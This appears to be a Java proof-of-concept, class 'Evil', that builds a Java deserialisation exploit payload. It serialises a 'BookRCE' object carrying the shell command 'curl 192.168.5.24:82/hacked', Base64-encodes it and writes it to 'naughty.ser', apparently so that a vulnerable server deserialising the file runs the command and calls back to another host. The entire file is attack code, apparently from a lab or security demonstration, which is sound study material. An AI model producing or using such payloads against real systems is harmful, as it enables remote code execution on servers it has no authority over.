package com.example.my.tests;

import java.io.*;
import java.util.Base64;

public class Evil {
    public static void main(String[] args) {
        BookRCE myBook = new BookRCE("someTitle", "blub", "curl 192.168.5.24:82/hacked");
        String myBookSerialized = serializeBook(myBook);
		
		try {
			FileWriter fileWriter = new FileWriter("naughty.ser");
			PrintWriter printWriter = new PrintWriter(fileWriter);
			printWriter.print(myBookSerialized);
			printWriter.close();
		} catch (Exception e) {
            System.out.println(e.toString());
        }
    }

    public static String serializeBook(BookRCE myBook) {
		ByteArrayOutputStream baos = null;

		try {
			baos = new ByteArrayOutputStream();
			ObjectOutputStream oos = new ObjectOutputStream(baos);
			oos.writeObject(myBook);
			oos.close();
		}
		catch(Exception e)
		{
			System.out.println(e);
		}

		return Base64.getEncoder().encodeToString(baos.toByteArray());
	}
}
